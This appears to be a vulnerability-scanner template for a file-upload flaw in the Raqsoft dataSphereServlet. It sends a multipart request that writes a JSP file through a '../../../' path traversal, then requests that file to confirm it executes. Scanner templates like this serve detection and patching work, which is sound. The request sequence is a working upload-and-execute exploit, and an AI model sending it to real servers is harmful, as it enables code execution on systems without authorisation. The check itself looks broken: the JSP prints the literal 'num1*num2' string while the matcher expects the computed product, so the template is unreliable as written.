id: raqsoft-datasphereservlet-upload

info:
  name: Raqsoft dataSphereServlet - File Upload
  author: qwtd
  severity: critical
  description: Raqsoft dataSphereServlet interface has file upload vulnerability.
  reference:
    - https://blog.csdn.net/u010025272/article/details/138368580
  metadata:
    max-request: 1
  tags: 润乾报表

variables:
  num1: "{{rand_int(800000, 999999)}}"
  num2: "{{rand_int(800000, 999999)}}"
  result: "{{to_number(num1)*to_number(num2)}}"
  filename: '{{rand_base(6)}}'

http:
  - raw:
      - |
        POST /servlet/dataSphereServlet?action=38 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 397
        Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="openGrpxFile"; filename="{{filename}}.jsp"
        Content-Type: text/plain

        <% out.println("{{num1}}*{{num2}}"); %>
        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="path"

        ../../../
        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="saveServer"

        1
        --eac629ee4641cb0fe10596fba5e0c5d9--

      - |
        GET /{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{result}}"
      - type: status
        status:
          - 200